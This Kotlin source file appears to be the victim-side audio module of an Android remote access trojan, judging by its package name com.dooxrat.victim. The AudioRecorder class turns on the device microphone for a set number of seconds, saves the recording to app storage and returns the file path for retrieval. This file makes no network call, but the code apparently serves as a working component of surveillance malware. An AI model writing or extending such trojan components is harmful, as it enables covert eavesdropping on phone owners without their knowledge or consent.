package com.dooxrat.victim

import android.content.Context
import android.media.MediaRecorder
import android.os.Environment
import java.io.File

class AudioRecorder(private val context: Context) {

    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null

    fun startRecording(duration: Int): String? {
        try {
            outputFile = File(
                context.getExternalFilesDir(Environment.DIRECTORY_MUSIC),
                "audio_${System.currentTimeMillis()}.mp3"
            )

            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(outputFile!!.absolutePath)
                prepare()
                start()
            }

            android.os.Handler().postDelayed({
                stopRecording()
            }, duration.toLong() * 1000)

            return outputFile?.absolutePath
        } catch (e: Exception) {
            e.printStackTrace()
            return null
        }
    }

    fun stopRecording() {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.release()
            mediaRecorder = null
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
